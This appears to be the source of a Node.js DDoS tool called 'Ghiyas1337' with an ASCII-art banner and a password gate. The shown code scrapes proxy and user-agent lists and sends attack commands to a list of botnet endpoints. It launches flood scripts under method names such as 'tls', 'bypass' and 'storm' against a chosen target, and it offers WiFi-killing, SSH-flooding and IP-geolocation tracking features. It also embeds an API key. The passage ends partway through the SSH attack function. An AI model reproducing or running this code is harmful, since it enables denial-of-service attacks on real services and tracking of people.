#!/usr/bin/env node

const { exec, spawn  } = require('child_process')
const readline = require('readline')
const url = require('url')
const fs = require('fs')
const axios = require('axios')
const path = require('path')
const version = '5.1.9'
let processList = [];
const cyan = '\x1b[96m'
const bold = '\x1b[1m';
const back_putih = '\x1b[48;5;255m';
const teksmerah = '\x1b[31m';
const Reset = '\x1b[0m';
const biru = '\x1b[36m'
const hijau = '\x1b[38;2;144;238;144m'

const permen = readline.createInterface({
  input: process.stdin,
  output: process.stdout
})
// [========================================] //
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
// [========================================] //
async function banner() {
console.clear()
console.log(`
\x1b[96m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣿⣿⣿⣿⣿⣿\x1b[0m     ${bold}${hijau}Welcome to Ghiyas1337 Script${Reset}
\x1b[96m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⡾⠿⢇⣀⠀⠀⣿⣿\x1b[0m          ${hijau}Full Power DDoS Tools${Reset}
\x1b[96m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣤⡿⠿⠇⢀⡰⠋⣇⣀⣿⣿\x1b[0m ______________________________________________
\x1b[96m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⣤⡾⠿⢇⢀⣈⠉⢆⣀⡿⣿⡁⠀\x1b[0m
\x1b[96m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣤⣾⠿⢧⣀⡸⠌⢁⣠⣸⡿⠷⠀⠀⠀\x1b[0m     Telegram: ${biru}@Ghiyas1337${Reset}
\x1b[96m⠀⠀⠀⢠⣶⣤⣴⡦⠀⠀⠀⠀⠠⣲⣾⠿⠿⣀⡸⠍⢡⣤⣼⡿⠿⠀⠀⠀⠀⠀\x1b[0m     Channel: ${biru}t.me/Ghiyas1337${Reset}
\x1b[96m⠀⠀⠀⢸⣿⣿⢿⣷⣲⣦⠀⣶⣺⠝⠛⣀⢤⠃⢠⣤⣼⠿⠣⠀⠀⠀⠀⠀⠀⠀\x1b[0m     Version: ${version}
\x1b[96m⠀⠀⠀⠺⠿⣿⣮⣟⠛⣻⣾⡟⠛⣤⣤⠓⢨⣤⣼⠿⠿⠂⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m     VIP: Yes
\x1b[96m⠀⠀⠀⠀⠀⣿⣿⣯⠐⡛⠛⣧⣴⠓⠚⣦⣼⠛⠻⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m     Max time: 89400
\x1b[96m⠀⠀⠀⠀⠀⠙⠻⣷⣾⣶⢷⣾⣿⣶⣶⡿⠛⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m     Expired: ∞
\x1b[96m⠀⠀⠀⠀⠀⣾⣿⣿⣻⣿⣾⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⡀⣀⠀⣴⣿⡾⢩⢿⣿⣿⠛⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⣿⣿⣿⣿⡿⣽⣿⡏⠛⠋⠀⠉⠉⠙⢻⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⣿⣿⣟⣿⣿⣿⠏⠉⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
Welcome to my DDoS tools!!! you can contact me if you find a bug
Type ${bold}${hijau}"srvmenu"${Reset} For Showing All Server Menu
========================================================================`)}
// [========================================] //
async function scrapeProxy() {
  try {
    const response = await fetch('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt');
    const data = await response.text();
    fs.writeFileSync('proxy.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}
// [========================================] //
async function scrapeUserAgent() {
  try {
    const response = await fetch('https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt');
    const data = await response.text();
    fs.writeFileSync('ua.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}
// [========================================] //
function clearProxy() {
  if (fs.existsSync('proxy.txt')) {
    fs.unlinkSync('proxy.txt');
  }
}
// [========================================] //
function clearUserAgent() {
  if (fs.existsSync('ua.txt')) {
    fs.unlinkSync('ua.txt');
  }
}
// [========================================] //
async function bootup() {
  try {
    console.log(`|| ▓░░░░░░░░░ || 10%`);
    await exec(`npm i axios tls http2 hpack net cluster crypto ssh2 dgram @whiskeysockets/baileys libphonenumber-js chalk gradient-string pino mineflayer proxy-agent url`)
    console.log(`|| ▓▓░░░░░░░░ || 20%`);
    const getLatestVersion = await fetch('https://raw.githubusercontent.com/Supranicol/siunn/main/sukibatjjuurr/verr.txt');
    const latestVersion = await getLatestVersion.text()
    console.log(`|| ▓▓▓░░░░░░░ || 30%`);
    if (version === latestVersion.trim()) {
    console.log(`|| ▓▓▓▓▓▓░░░░ || 60%`);
    
    const secretBangetJir = await fetch('https://raw.githubusercontent.com/vodkaagege/tools/refs/heads/main/sucktool');
    const password = await secretBangetJir.text();
    await console.log(`Login Key Required`)
    permen.question(`${back_putih}${teksmerah}Input Password${Reset}: `, async (skibidi) => {
      if (skibidi === password.trim()) {
        console.log(`Successfuly Logged`)
        await scrapeProxy()
        console.log(`|| ▓▓▓▓▓▓▓░░░ || 70%`)
        await scrapeUserAgent()
        console.log(`|| ▓▓▓▓▓▓▓▓▓▓ || 100%`)
        await sleep(700)
        console.clear()
        console.log(`Welcome To ${biru}Ghiyas${Reset} ${hijau}DDoS Tools!${Reset}${version}`)
        await sleep(1000)
		    await banner()
        console.log(`Type ${hijau}"help"${Reset} For Showing All Available Command`)
        sigma()
      } else {
        console.log(`Wrong Key`)
        process.exit(-1);
      }
    }) 
  } else {
      console.log(`This Version Is Outdated. ${version} => ${latestVersion.trim()}`)
      console.log(`Waiting Auto Update...`)
      await exec(`npm uninstall -g prmnmd-tuls`)
      console.log(`Installing update`)
      await exec(`npm i -g prmnmd-tuls`)
      console.log(`Restart Tools Please`)
      process.exit()
    }
  } catch (error) {
    console.log(`Are You Online?`)
  }
}
// [========================================] //
async function killWifi() {
const wifiPath = path.join(__dirname, `/lib/cache/StarsXWiFi`);
const startKillwiFi = spawn('node', [wifiPath]);
console.log(`
WiFi Killer Has Started
Type exit To Stop
`);
permen.question(`${back_putih}${teksmerah}Ghiyas-DDoS${Reset}➔ ${back_putih}${teksmerah}WiFi Killer${Reset}: \n`, async (yakin) => {
if (yakin === 'exit') {
  startKillwiFi.kill('SIGKILL')
  console.log(`WiFi Killer Has Ended`)
  sigma()
} else {
  console.log(`do you mean 'exit'?`)
  sigma()
}})
}
// [========================================] //

async function AttackBotnetEndpoints(args) {
    if (args.length < 3) {
        console.log(`Example: srvattack <target> <duration> <methods>
botnet https://google.com 120 flood`);
        sigma();
        return;
    }
    const [target, duration, methods] = args;
    let result;
    try {
        const parsing = new url.URL(target);
        const hostname = parsing.hostname;
        const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`);
        result = scrape.data;
        const startTime = Date.now();
        const endTime = startTime + duration * 1000;
        processList.push({ target, methods, startTime, duration, endTime, ip: result.query });
        console.clear();
        console.log(`
\x1b[96m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣿⣿⣿⣿⣿⣿\x1b[0m     ${bold}${teksmerah}Attack Sent To All Server${Reset}
\x1b[96m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⡾⠿⢇⣀⠀⠀⣿⣿\x1b[0m     Type ${bold}${biru}"cls"${Reset} to clear terminal
\x1b[96m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣤⡿⠿⠇⢀⡰⠋⣇⣀⣿⣿\x1b[0m  ______________________________________________
\x1b[96m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⣤⡾⠿⢇⢀⣈⠉⢆⣀⡿⣿⡁⠀\x1b[0m   ∆ Attack Information:
\x1b[96m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣤⣾⠿⢧⣀⡸⠌⢁⣠⣸⡿⠷⠀⠀⠀\x1b[0m    - Target: ${target}
\x1b[96m⠀⠀⠀⢠⣶⣤⣴⡦⠀⠀⠀⠀⠠⣲⣾⠿⠿⣀⡸⠍⢡⣤⣼⡿⠿⠀⠀⠀⠀⠀\x1b[0m    - Duration: ${duration} sec
\x1b[96m⠀⠀⠀⢸⣿⣿⢿⣷⣲⣦⠀⣶⣺⠝⠛⣀⢤⠃⢠⣤⣼⠿⠣⠀⠀⠀⠀⠀⠀⠀\x1b[0m    - Methods: ${methods}
\x1b[96m⠀⠀⠀⠺⠿⣿⣮⣟⠛⣻⣾⡟⠛⣤⣤⠓⢨⣤⣼⠿⠿⠂⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m    - Concurrents: 1/1
\x1b[96m⠀⠀⠀⠀⠀⣿⣿⣯⠐⡛⠛⣧⣴⠓⠚⣦⣼⠛⠻⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m 
\x1b[96m⠀⠀⠀⠀⠀⠙⠻⣷⣾⣶⢷⣾⣿⣶⣶⡿⠛⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m   ∆ Target Detail:
\x1b[96m⠀⠀⠀⠀⠀⣾⣿⣿⣻⣿⣾⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m    - ISP: [ ${cyan}${result.isp}${Reset} ]
\x1b[96m⡀⣀⠀⣴⣿⡾⢩⢿⣿⣿⠛⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m    - IP: [ ${cyan}${result.query}${Reset} ]
\x1b[96m⣿⣿⣿⣿⡿⣽⣿⡏⠛⠋⠀⠉⠉⠙⢻⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m    - AS: [ ${cyan}${result.as}${Reset} ]
\x1b[96m⣿⣿⣟⣿⣿⣿⠏⠉⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m

</> Note: ${bold}${hijau}Please do not spam attack wait until this attack is over${Reset}

========================================================================
`);
        sigma();
    } catch (error) {
        console.error('Error retrieving target information:', error.message);
    }

    let botnetData;
    let successCount = 0;
    const timeout = 20000;
    const validEndpoints = [];

    // Load botnet data
    try {
        botnetData = JSON.parse(fs.readFileSync('./lib/botnet.json', 'utf8'));
    } catch (error) {
        console.error('Error loading botnet data:', error.message);
        botnetData = { endpoints: [] };
    }

    // Send requests to each endpoint
    const requests = botnetData.endpoints.map(async (endpoint) => {
        const apiUrl = `${endpoint}?target=${target}&time=${duration}&methods=${methods}`;

        try {
            const response = await axios.get(apiUrl, { timeout });
            if (response.status === 200) {
                successCount++;
                validEndpoints.push(endpoint);
            }
        } catch (error) {
            console.error(`Error sending request to ${endpoint}: ${error.message}`);
        }
    });

    await Promise.all(requests);

    // Save valid endpoints back to the file
    botnetData.endpoints = validEndpoints;
    try {
        fs.writeFileSync('./lib/botnet.json', JSON.stringify(botnetData, null, 2));
    } catch (error) {
        console.error('Error saving botnet data:', error.message);
        sigma();
    }
}

async function processBotnetEndpoint(args) {
    if (args.length < 1) {
    console.log(`Example: addsrv <endpoints>
add-botnet http://1.1.1.1:2000/permen`);
    sigma();
	return
  }
    try {
        const parsedUrl = new url.URL(args);
        const hostt = parsedUrl.host;
        const endpoint = 'http://' + hostt + '/permen';

        // Load botnet data
        let botnetData;
        try {
            const data = await fs.promises.readFile('./lib/botnet.json', 'utf8');
            botnetData = JSON.parse(data);
        } catch (error) {
            console.error('Error loading botnet data:', error.message);
            botnetData = { endpoints: [] };
        }

        // Check if endpoint already exists
        if (botnetData.endpoints.includes(endpoint)) {
            return console.log(`Endpoint ${endpoint} is already in the botnet list.`);
            sigma();
            return;           
        }

        // Add endpoint and save data
        botnetData.endpoints.push(endpoint);
        try {
            await fs.promises.writeFile('./lib/botnet.json', JSON.stringify(botnetData, null, 2));
        } catch (error) {
            console.error('Error saving botnet data:', error.message);
            return console.log('Error saving botnet data.');
        }

        // Reply with success message
        console.log(`Endpoint ${endpoint} added to botnet.`);
        sigma()
    } catch (error) {
        console.error('Error processing botnet endpoint:', error.message);
        console.log('An error occurred while processing the endpoint.');
        sigma()
    }
}

async function getIPAddress(target) {
    try {
        const parsing = new url.URL(target);
        const hostname = parsing.hostname;
        const response = await axios.get(`http://ip-api.com/json/${hostname}?fields=query`);

        if (response.data && response.data.status === "success") {
            return response.data.query;
        } else {
            return target;
        }
    } catch (error) {
        console.error("Error fetching IP address:", error);
        return target;
    }
}

async function monitorOngoingAttacks() {
    // Filter proses yang masih berjalan
    processList = processList.filter((process) => {
        const remaining = Math.max(0, Math.floor((process.endTime - Date.now()) / 1000));
        return remaining > 0;
    });

    if (processList.length === 0) {
        console.log("Tidak ada serangan yang sedang berlangsung.");
        sigma();
        return;
    }

    // Membuat tabel serangan
    let attackDetails = "\n=== Ongoing Attacks ===\n";
    attackDetails += `┌─────┬──────────────────────┬───────┬──────────┬─────────┐\n`;
    attackDetails += `│  #  │        HOST          │ SINCE │ DURATION │ METHOD  │\n`;
    attackDetails += `├─────┼──────────────────────┼───────┼──────────┼─────────┤\n`;

    // Isi tabel dengan data proses
    processList.forEach((process, index) => {
        const host = process.ip || process.target;
        const since = Math.floor((Date.now() - process.startTime) / 1000);
        const duration = `${process.duration} sec`; // Menampilkan durasi dalam detik

        // Baris data
        attackDetails += `│ ${String(index + 1).padEnd(3)} │ ${host.padEnd(20)} │ ${String(since).padEnd(5)} │ ${duration.padEnd(8)} │ ${process.methods.padEnd(7)} │\n`;
    });

    // Garis bawah tabel
    attackDetails += `└─────┴──────────────────────┴───────┴──────────┴─────────┘\n`;

    console.log(attackDetails);
    sigma();
}

async function checkBotnetEndpoints() {
    let botnetData;
    let successCount = 0;
    const timeout = 20000;
    const validEndpoints = [];

    // Load botnet data
    try {
        botnetData = JSON.parse(fs.readFileSync('./lib/botnet.json', 'utf8'));
    } catch (error) {
        console.error('Error loading botnet data:', error.message);
        botnetData = { endpoints: [] };
    }

    // Send requests to each endpoint
    const requests = botnetData.endpoints.map(async (endpoint) => {
        const apiUrl = `${endpoint}?target=https://google.com&time=1&methods=ninja`;

        try {
            const response = await axios.get(apiUrl, { timeout });
            if (response.status === 200) {
                successCount++;
                validEndpoints.push(endpoint);
            }
        } catch (error) {
            console.error(`Error sending request to ${endpoint}: ${error.message}`);
        }
    });

    await Promise.all(requests);
    botnetData.endpoints = validEndpoints;
    try {
        fs.writeFileSync('./lib/botnet.json', JSON.stringify(botnetData, null, 2));
    } catch (error) {
        console.error('Error saving server data:', error.message);
        sigma()
    }

    // Reply with the results
    console.log(`Checked server. ${successCount} server online.`);
    sigma()
}


async function trackIP(args) {
  if (args.length < 1) {
    console.log(`Example: track-ip <ip address>
track-ip 1.1.1.1`);
    sigma();
	return
  }
const [target] = args
  if (target === '0.0.0.0') {
  console.log(`Jangan Di Ulangi Manis Nanti Di Delete User Mu`)
	sigma()
  } else {
    try {
const apiKey = '8fd0a436e74f44a7a3f94edcdd71c696';
const response = await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}&ip=${target}`);
const res = await fetch(`https://ipwho.is/${target}`);
const additionalInfo = await res.json();
const ipInfo = await response.json();

    console.clear()
    console.log(`
\x1b[96m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣿⣿⣿⣿⣿⣿\x1b[0m
\x1b[96m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⡾⠿⢇⣀⠀⠀⣿⣿\x1b[0m
\x1b[96m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣤⡿⠿⠇⢀⡰⠋⣇⣀⣿⣿\x1b[0m
\x1b[96m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⣤⡾⠿⢇⢀⣈⠉⢆⣀⡿⣿⡁⠀\x1b[0m
\x1b[96m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣤⣾⠿⢧⣀⡸⠌⢁⣠⣸⡿⠷⠀⠀⠀\x1b[0m
\x1b[96m⠀⠀⠀⢠⣶⣤⣴⡦⠀⠀⠀⠀⠠⣲⣾⠿⠿⣀⡸⠍⢡⣤⣼⡿⠿⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⠀⠀⠀⢸⣿⣿⢿⣷⣲⣦⠀⣶⣺⠝⠛⣀⢤⠃⢠⣤⣼⠿⠣⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⠀⠀⠀⠺⠿⣿⣮⣟⠛⣻⣾⡟⠛⣤⣤⠓⢨⣤⣼⠿⠿⠂⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⠀⠀⠀⠀⠀⣿⣿⣯⠐⡛⠛⣧⣴⠓⠚⣦⣼⠛⠻⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⠀⠀⠀⠀⠀⠙⠻⣷⣾⣶⢷⣾⣿⣶⣶⡿⠛⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⠀⠀⠀⠀⠀⣾⣿⣿⣻⣿⣾⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⡀⣀⠀⣴⣿⡾⢩⢿⣿⣿⠛⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⣿⣿⣿⣿⡿⣽⣿⡏⠛⠋⠀⠉⠉⠙⢻⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⣿⣿⣟⣿⣿⣿⠏⠉⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
                     Tracking IP Address Result 
                     Type ${bold}${biru}"cls"${Reset} to clear terminal
========================================================================
 - Flags: ${ipInfo.country_flag}
 - Country: ${ipInfo.country_name}
 - Capital: ${ipInfo.country_capital}
 - City: ${ipInfo.city}
 - ISP: ${ipInfo.isp}
 - Organization: ${ipInfo.organization}
 - lat: ${ipInfo.latitude}
 - long: ${ipInfo.longitude}
      
 Google Maps: https://www.google.com/maps/place/${additionalInfo.latitude}+${additionalInfo.longitude}
`)
    sigma()
  } catch (error) {
      console.log(`Error Tracking ${target}`)
      sigma()
    }
    }
};
// [========================================] //
async function pushOngoing(target, methods, duration) {
  const startTime = Date.now();
  processList.push({ target, methods, startTime, duration })
  setTimeout(() => {
    const index = processList.findIndex((p) => p.methods === methods);
    if (index !== -1) {
      processList.splice(index, 1);
    }
  }, duration * 1000);
}
// [========================================] //
function ongoingAttack() {
  console.log("\nOngoing Attack:\n");
  processList.forEach((process) => {
console.log(`Target: ${process.target}
Methods: ${process.methods}
Duration: ${process.duration} Seconds
Since: ${Math.floor((Date.now() - process.startTime) / 1000)} seconds ago\n`);
  });
}
// [========================================] //
async function handleAttackCommand(args) {
  if (args.length < 3) {
    console.log(`Example: attack <target> <duration> <methods>
attack https://google.com 120 flood`);
    sigma();
	return
  }
const [target, duration, methods] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;

console.clear()
console.log(`
\x1b[96m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣿⣿⣿⣿⣿⣿\x1b[0m     ${bold}${teksmerah}Attack Successfully Sent${Reset}
\x1b[96m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⡾⠿⢇⣀⠀⠀⣿⣿\x1b[0m     Type ${bold}${biru}"cls"${Reset} to clear terminal
\x1b[96m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣤⡿⠿⠇⢀⡰⠋⣇⣀⣿⣿\x1b[0m  ______________________________________________\n
\x1b[96m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⣤⡾⠿⢇⢀⣈⠉⢆⣀⡿⣿⡁⠀\x1b[0m   ∆ Attack Information:
\x1b[96m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣤⣾⠿⢧⣀⡸⠌⢁⣠⣸⡿⠷⠀⠀⠀\x1b[0m    - Target: ${target}
\x1b[96m⠀⠀⠀⢠⣶⣤⣴⡦⠀⠀⠀⠀⠠⣲⣾⠿⠿⣀⡸⠍⢡⣤⣼⡿⠿⠀⠀⠀⠀⠀\x1b[0m    - Duration: ${duration} sec
\x1b[96m⠀⠀⠀⢸⣿⣿⢿⣷⣲⣦⠀⣶⣺⠝⠛⣀⢤⠃⢠⣤⣼⠿⠣⠀⠀⠀⠀⠀⠀⠀\x1b[0m    - Methods: ${methods}
\x1b[96m⠀⠀⠀⠺⠿⣿⣮⣟⠛⣻⣾⡟⠛⣤⣤⠓⢨⣤⣼⠿⠿⠂⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m    - Concurrents: 1/1
\x1b[96m⠀⠀⠀⠀⠀⣿⣿⣯⠐⡛⠛⣧⣴⠓⠚⣦⣼⠛⠻⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m 
\x1b[96m⠀⠀⠀⠀⠀⠙⠻⣷⣾⣶⢷⣾⣿⣶⣶⡿⠛⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m   ∆ Target Detail:
\x1b[96m⠀⠀⠀⠀⠀⣾⣿⣿⣻⣿⣾⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m    - ISP: [ ${cyan}${result.isp}${Reset} ]
\x1b[96m⡀⣀⠀⣴⣿⡾⢩⢿⣿⣿⠛⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m    - IP: [ ${cyan}${result.query}${Reset} ]
\x1b[96m⣿⣿⣿⣿⡿⣽⣿⡏⠛⠋⠀⠉⠉⠙⢻⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m    - AS: [ ${cyan}${result.as}${Reset} ]
\x1b[96m⣿⣿⣟⣿⣿⣿⠏⠉⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m

</> Note: ${bold}${hijau}Please do not spam attack wait until this attack is over${Reset}
========================================================================

`)
} catch (error) {
  console.log(`Oops Something Went wrong`)
}
const metode = path.join(__dirname, `/lib/cache/${methods}`);
  if (methods === 'flood') {
   pushOngoing(target, methods, duration)
   exec(`node ${metode} ${target} ${duration}`)
	sigma()
  } else if (methods === 'tls') {
    pushOngoing(target, methods, duration)
     exec(`node ${metode} ${target} ${duration} 100 10`)
    sigma()
    } else if (methods === 'strike') {
      pushOngoing(target, methods, duration)
       exec(`node ${metode} GET ${target} ${duration} 10 90 proxy.txt --full`)
      sigma()
      } else if (methods === 'kill') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10`)
        sigma()
        } else if (methods === 'bypass') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
          } else if (methods === 'raw') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration}`)
          sigma()
          } else if (methods === 'thunder') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
          } else if (methods === 'rape') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${duration} 10 proxy.txt 70 ${target}`)
          sigma()
          } else if (methods === 'storm') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
          } else if (methods === 'destroy') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
          } else if (methods === 'quantum') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 4 proxy.txt`)
          sigma()
          } else if (methods === 'slim') {
       pushOngoing(target, methods, duration)
const destroy = path.join(__dirname, `/lib/cache/destroy.js`);
const storm = path.join(__dirname, `/lib/cache/storm.js`);
const rape = path.join(__dirname, `/lib/cache/rape.js`);
        exec(`node ${destroy} ${target} ${duration} 100 1 proxy.txt`)
        exec(`node ${storm} ${target} ${duration} 100 1 proxy.txt`)
        exec(`node ${rape} ${duration} 1 proxy.txt 70 ${target}`)
          sigma()
          } else {
    console.log(`Method ${methods} not recognized.`);
  }
};
// [========================================] //
async function killSSH(args) {
  if (args.length < 2) {
    console.log(`Example: kill-ssh <target> <duration>
kill-ssh 123.456.789.10 120 flood`);
    sigma();
	return
  }
const [target, duration] = args
try {
const scrape = await axios.get(`http://ip-api.com/json/${target}?fields=isp,query,as`)
const result = scrape.data;

console.clear()
console.log(`
\x1b[96m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣿⣿⣿⣿⣿⣿\x1b[0m     ${bold}${teksmerah}Attack Sent To All Server${Reset}
\x1b[96m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⡾⠿⢇⣀⠀⠀⣿⣿\x1b[0m     Type ${bold}${biru}"cls"${Reset} to clear terminal
\x1b[96m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣤⡿⠿⠇⢀⡰⠋⣇⣀⣿⣿\x1b[0m ______________________________________________
\x1b[96m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⣤⡾⠿⢇⢀⣈⠉⢆⣀⡿⣿⡁⠀\x1b[0m   ∆ Attack Information:
\x1b[96m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣤⣾⠿⢧⣀⡸⠌⢁⣠⣸⡿⠷⠀⠀⠀\x1b[0m    - Target: ${target}
\x1b[96m⠀⠀⠀⢠⣶⣤⣴⡦⠀⠀⠀⠀⠠⣲⣾⠿⠿⣀⡸⠍⢡⣤⣼⡿⠿⠀⠀⠀⠀⠀\x1b[0m    - Duration: ${duration} sec
\x1b[96m⠀⠀⠀⢸⣿⣿⢿⣷⣲⣦⠀⣶⣺⠝⠛⣀⢤⠃⢠⣤⣼⠿⠣⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⠀⠀⠀⠺⠿⣿⣮⣟⠛⣻⣾⡟⠛⣤⣤⠓⢨⣤⣼⠿⠿⠂⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m    - Concurrents: 1/1\n
\x1b[96m⠀⠀⠀⠀⠀⣿⣿⣯⠐⡛⠛⣧⣴⠓⠚⣦⣼⠛⠻⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m 
